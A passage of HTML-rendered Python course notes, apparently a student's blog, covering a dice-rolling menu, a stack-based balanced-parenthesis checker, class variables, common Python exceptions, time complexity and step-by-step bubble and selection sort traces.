class="string">&quot;Rolling the D4 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Rolling the D6 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">8</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Rolling the D8 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Rolling the D10 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">12</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Rolling the D12 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">20</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Rolling the D20 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">            random_number = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Rolling the D100 dice..........and it rolled &quot;</span>, random_number)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&#x27;8&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;see U&quot;</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You have enter invalid choice. Try again&quot;</span>)</span><br><span class="line">            choice = <span class="built_in">input</span>(<span class="string">&quot;Enter your choice: &quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">choice()</span><br></pre></td></tr></table></figure></div><hr><h1 id="week6"><a href="#week6" class="headerlink" title="week6"></a>week6</h1><h2 id="workshop-Balanced-Parenthesis"><a href="#workshop-Balanced-Parenthesis" class="headerlink" title="workshop Balanced Parenthesis"></a>workshop Balanced Parenthesis</h2><p><strong>Stack ADT</strong><br>Compare those above with the following, which are not balanced:</p><p><code>((()</code></p><p><code>()()()(()</code></p><p><code>((()))(</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span>:</span><br><span class="line">    <span class="comment"># creates a new stack</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.the_stack = [] <span class="comment"># represent the stack as a list</span></span><br><span class="line">        self.count = <span class="number">0</span> <span class="comment"># indicate the current size of the stack</span></span><br><span class="line">        self.top = -<span class="number">1</span> <span class="comment"># indicate the top position of the stack</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># returns the number of items in the stack</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.count</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># returns True if the stack is empty or False otherwise</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_empty</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self) == <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># pushes an item onto the top of the stack</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">self, item</span>):</span><br><span class="line">        self.the_stack.append(item)</span><br><span class="line">        self.top += <span class="number">1</span></span><br><span class="line">        self.count += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># removes and returns the top item on the stack</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="keyword">not</span> self.is_empty(), <span class="string">&quot;Cannot pop from an empty stack&quot;</span></span><br><span class="line">        </span><br><span class="line">        item = self.the_stack[self.top]</span><br><span class="line">        self.top -= <span class="number">1</span></span><br><span class="line">        self.count -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">del</span> self.the_stack[<span class="built_in">len</span>(self)]</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># returns the item on the stack without removing it</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">peek</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="keyword">not</span> self.is_empty(), <span class="string">&quot;Cannot peek at an empty stack&quot;</span></span><br><span class="line">        item = self.the_stack[self.top]</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_balanced_parenthesis</span>(<span class="params">string_of_parenthesis</span>):</span><br><span class="line">    <span class="comment"># Your solution goes here </span></span><br><span class="line">    stack = Stack()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> string_of_parenthesis:</span><br><span class="line">        <span class="keyword">if</span> p == <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">            stack.push(p)</span><br><span class="line">        <span class="keyword">elif</span> p == <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> stack.is_empty():</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stack.pop()</span><br><span class="line">    <span class="keyword">return</span> stack.is_empty()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(check_for_balanced_parenthesis(<span class="string">&#x27;((()&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(check_for_balanced_parenthesis(<span class="string">&#x27;(())&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(check_for_balanced_parenthesis((<span class="string">&#x27;()()()(()&#x27;</span>)))</span><br></pre></td></tr></table></figure></div><h2 id="applied"><a href="#applied" class="headerlink" title="applied"></a>applied</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> IPython.display <span class="keyword">import</span> YouTubeVideo</span><br><span class="line"><span class="comment"># display(YouTubeVideo(&quot;I2wURDqiXdM&quot;))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Laptop</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, brand</span>):</span><br><span class="line">        self.brand = brand</span><br><span class="line">       <span class="comment"># pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_brand</span>(<span class="params">self</span>): <span class="comment"># self is related itself </span></span><br><span class="line">        <span class="built_in">print</span>(lap1.brand)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play_video</span>(<span class="params">self, video_id=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        display(YouTubeVideo(video_id))</span><br><span class="line"></span><br><span class="line">lap1 = Laptop(<span class="string">&quot;Lenovo&quot;</span>)</span><br><span class="line">lap1.print_brand()</span><br><span class="line"></span><br><span class="line">lap2 = Laptop(<span class="string">&quot;I2wURDqiXdM&quot;</span>)</span><br><span class="line"><span class="comment">#print(lap1.brand)</span></span><br><span class="line">lap2.play_video()</span><br></pre></td></tr></table></figure></div><h2 id="Class-variables"><a href="#Class-variables" class="headerlink" title="Class variables"></a>Class variables</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Laptop</span>:</span><br><span class="line">    object_counter = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">increase_one</span>(<span class="params">self</span>):</span><br><span class="line">        Laptop.object_counter += <span class="number">1</span></span><br><span class="line">        self.counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">lap1 = Laptop()</span><br><span class="line">lap1.increase_one()</span><br><span class="line"><span class="built_in">print</span>(Laptop.object_counter)</span><br><span class="line"><span class="built_in">print</span>(lap1.counter)</span><br><span class="line">lap2 = Laptop()</span><br><span class="line">lap2.increase_one()</span><br><span class="line"><span class="built_in">print</span>(Laptop.object_counter)</span><br><span class="line"><span class="built_in">print</span>(lap2.counter)</span><br></pre></td></tr></table></figure></div><p>output </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">1</span><br></pre></td></tr></table></figure></div><hr><h1 id="week7"><a href="#week7" class="headerlink" title="week7"></a>week7</h1><h2 id="SyntaxError"><a href="#SyntaxError" class="headerlink" title="SyntaxError:"></a>SyntaxError:</h2><p>Errors in the syntax of your program (parsing errors in Python)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> a_number &gt; <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(a_number, “<span class="keyword">is</span> greater than <span class="number">2</span>”)</span><br></pre></td></tr></table></figure></div><h2 id="NameError-exception-in-Python"><a href="#NameError-exception-in-Python" class="headerlink" title="NameError: (exception in Python)"></a>NameError: (exception in Python)</h2><p>Attempt to use a variable (or value) before initialising it; attempt to use a module or function without first importing it</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a_number = random.random()</span><br></pre></td></tr></table></figure></div><h2 id="TypeError-exception-in-Python"><a href="#TypeError-exception-in-Python" class="headerlink" title="TypeError: (exception in Python)"></a>TypeError: (exception in Python)</h2><p>Attempt to use incompatible data types within a single statement; attempt to pass an argument of the wrong type</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a_number = <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> a_number &gt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(a_number + “<span class="keyword">is</span> greater than <span class="number">2</span>”)</span><br></pre></td></tr></table></figure></div><p>or</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_function</span>(<span class="params">first_arg, second_arg</span>):</span><br><span class="line">    result = first_arg + second_arg</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_function(<span class="string">&#x27;1&#x27;</span>,<span class="number">2</span>))</span><br></pre></td></tr></table></figure></div><h2 id="ValueError-exception-in-Python"><a href="#ValueError-exception-in-Python" class="headerlink" title="ValueError: (exception in Python)"></a>ValueError: (exception in Python)</h2><p>Attempt to pass an argument with the correct type but with a wrong value</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sum_of_two = <span class="built_in">int</span>(‘<span class="number">1</span>’) + <span class="built_in">int</span>(‘b’)</span><br></pre></td></tr></table></figure></div><h2 id="RuntimeError-exception-in-Python"><a href="#RuntimeError-exception-in-Python" class="headerlink" title="RuntimeError: (exception in Python)"></a>RuntimeError: (exception in Python)</h2><p>An error detected that doesn’t fall into any of the pre-defined error types</p><h2 id="Some-others-error"><a href="#Some-others-error" class="headerlink" title="Some others error"></a>Some others error</h2><ol><li>AttributeError</li></ol><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x=<span class="number">0</span>, y=<span class="number">0</span></span>):</span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_x</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.x</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_y</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.y</span><br><span class="line">a_point = Point(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">a_point.set_x(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></div><p>The code is responding with an <code>AttributeError</code> because the <code>set_x</code> method is not defined in the <code>Point</code> class. Therefore, when you try to call it on the <code>a_point</code> instance, Python raises an <code>AttributeError</code> because it cannot find the <code>set_x</code> method in the object’s attributes.</p><p>If the <code>set_x</code> method was defined in the <code>Point</code> class, but you still called it before defining it, then you would receive a <code>NameError</code>. The <code>NameError</code> would occur because Python would not recognize the <code>set_x</code> name and would not be able to resolve it to any defined object or method.</p><ol start="2"><li>IndexError</li></ol><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a_list = [‘<span class="number">1</span>’, ‘<span class="number">2</span>’, ‘<span class="number">3</span>’] </span><br><span class="line"><span class="built_in">print</span>(a_list[<span class="number">3</span>])</span><br></pre></td></tr></table></figure></div><h2 id="Exception-Handling-Try-and-Except-and-Else"><a href="#Exception-Handling-Try-and-Except-and-Else" class="headerlink" title="Exception Handling: Try and Except and Else"></a>Exception Handling: Try and Except and Else</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    num1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter first number: &#x27;</span>))</span><br><span class="line">    num2 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter second number: &#x27;</span>))</span><br><span class="line">    result = num1 // num2</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Result of division:&#x27;</span>, result)</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Invalid input value&#x27;</span>)</span><br><span class="line"><span class="comment">#except ZeroDivisionError:</span></span><br><span class="line"> <span class="comment">#   print(&#x27;Cannot divide by zero&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;else statement run when there is no exception&#x27;</span>)</span><br></pre></td></tr></table></figure></div><ul><li>else:<ul><li>Comes after all the except blocks (optional)</li><li>Useful where some code should be executed if the try block does not raise any exception.</li></ul></li></ul><hr><h1 id="week10"><a href="#week10" class="headerlink" title="week10"></a>week10</h1><p>排序算法</p><h2 id="时间复杂度-Time-Complexity"><a href="#时间复杂度-Time-Complexity" class="headerlink" title="时间复杂度 Time Complexity"></a>时间复杂度 Time Complexity</h2><p><a href="https://blog.csdn.net/jiangchufeng123/article/details/122396855">时间复杂度计算-例题集合</a><br><a href="https://blog.csdn.net/m1195900241/article/details/118443745">什么是时间复杂度？</a></p><h3 id="O-n"><a href="#O-n" class="headerlink" title="O(n)"></a>O(n)</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">2</span>,<span class="number">34</span>,<span class="number">8</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> each &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(each)</span><br></pre></td></tr></table></figure></div><h3 id="O-log-n"><a href="#O-log-n" class="headerlink" title="O(log$n$)"></a>O(log$n$)</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">        n = <span class="built_in">len</span>(data)-<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> n&gt;<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(data[n])</span><br><span class="line">            n = <span class="built_in">int</span>(n/<span class="number">2</span>)</span><br></pre></td></tr></table></figure></div><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bubble_sort</span>(<span class="params">a_list</span>):</span><br><span class="line">    sorted_list = a_list[:] <span class="comment"># make a copy of the original list</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">iter</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(sorted_list)):</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sorted_list) - <span class="built_in">iter</span>):</span><br><span class="line">            <span class="keyword">if</span> sorted_list[index] &gt; sorted_list[index + <span class="number">1</span>]:</span><br><span class="line">                sorted_list[index], sorted_list[index + <span class="number">1</span>] = sorted_list[index + <span class="number">1</span>], sorted_list[index]</span><br><span class="line">    <span class="keyword">return</span> sorted_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bubble_sort([<span class="number">3</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">8</span>])</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Case 1:</span><br><span class="line">3,2,6,7,1,8</span><br><span class="line">-----------</span><br><span class="line">1st iteration:</span><br><span class="line">2,3,6,7,1,8 [SWAP] (3 &gt; 2)</span><br><span class="line">2,3,6,7,1,8 [NO SWAP]</span><br><span class="line">2,3,6,7,1,8 [NO SWAP]</span><br><span class="line">2,3,6,1,7,8 [SWAP] (7 &gt; 1)</span><br><span class="line">2,3,6,1,7|8 [NO SWAP]</span><br><span class="line">Number of comparisons: 5</span><br><span class="line">Number of swaps: 2</span><br><span class="line">Last item (8) is sorted.</span><br><span class="line">-----------</span><br><span class="line">2st iteration:</span><br><span class="line">2,3,6,1,7|8 [NO SWAP]</span><br><span class="line">2,3,6,1,7|8 [NO SWAP]</span><br><span class="line">2,3,1,6,7|8 [SWAP] (6 &gt; 1)</span><br><span class="line">2,3,1,6|7,8 [NO SWAP]</span><br><span class="line">Number of comparisons: 4</span><br><span class="line">Number of swaps: 1</span><br><span class="line">Last 2 items (7,8) are sorted.</span><br><span class="line">-----------</span><br><span class="line">3rd iteration:</span><br><span class="line">2,3,1,6|7,8 [NO SWAP]</span><br><span class="line">2,1,3,6|7,8 [SWAP] (3 &gt; 1)</span><br><span class="line">2,1,3|6,7,8 [NO SWAP]</span><br><span class="line">Number of comparisons: 3</span><br><span class="line">Number of swaps: 1</span><br><span class="line">Last 3 items (6,7,8) are sorted.</span><br><span class="line">-----------</span><br><span class="line">4th iteration:</span><br><span class="line">1,2,3|6,7,8 [SWAP] (2 &gt; 1)</span><br><span class="line">1,2|3,6,7,8 [NO SWAP]</span><br><span class="line">Number of comparisons: 2</span><br><span class="line">Number of swaps: 1</span><br><span class="line">Last 4 items (3,6,7,8) are sorted.</span><br><span class="line">-----------</span><br><span class="line">5th iteration:</span><br><span class="line">1|2,3,6,7,8 [NO SWAP]</span><br><span class="line">Number of comparisons: 1</span><br><span class="line">Number of swaps: 0</span><br><span class="line">Last 5 items (2,3,6,7,8) are sorted, the remaining item is also sorted</span><br></pre></td></tr></table></figure></div><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">5,3,4,1,2</span><br><span class="line">bold item: smallest item searched</span><br><span class="line">italic item: current search</span><br><span class="line">red item: target</span><br><span class="line">-----------</span><br><span class="line">1st iteration: Searching smallest value <span class="keyword">for</span> index 0</span><br><span class="line">5,3,4,1,2 [5 is the smallest item so far]</span><br><span class="line">5,3,4,1,2 [3 is the smallest item so far]</span><br><span class="line">5,3,4,1,2</span><br><span class="line">5,3,4,1,2 [1 is the smallest item so far]</span><br><span class="line">5,3,4,1,2</span><br><span class="line">Swap items at index 0 and index 3.</span><br><span class="line">1|3,4,5,2</span><br><span class="line">Number of comparisons: 4(excluding target index)</span><br><span class="line">First item (1) is sorted.</span><br><span class="line">-----------</span><br><span class="line">2nd iteration: Searching smallest value <span class="keyword">for</span> index 1</span><br><span class="line">1|3,4,5,2 [3 is the smallest item so far]</span><br><span class="line">1|3,4,5,2 </span><br><span class="line">1|3,4,5,2</span><br><span class="line">1|3,4,5,2 [2 is the smallest item so far]</span><br><span class="line">Swap items at index 1 and index 4.</span><br><span class="line">1,2|4,5,3</span><br><span class="line">Number of comparisons: 3(excluding target index)</span><br><span class="line">First 2 items (1,2) are sorted.</span><br><span class="line">-----------</span><br><span class="line">3rd iteration: Searching smallest value <span class="keyword">for</span> index 2</span><br><span class="line">1,2|4,5,3 [4 is the smallest item so far]</span><br><span class="line">1,2|4,5,3</span><br><span class="line">1,2|4,5,3 [3 is the smallest item so far]</span><br><span class="line"></span><br><span class="line">Swap items at index 2 and index 4.</span><br><span class="line">1,2,3|5,4</span><br><span class="line">Number of comparisons: 2(excluding target index)</span><br><span class="line">First 3 items (1,2,3) are sorted.</span><br><span class="line">-----------</span><br><span class="line">4th 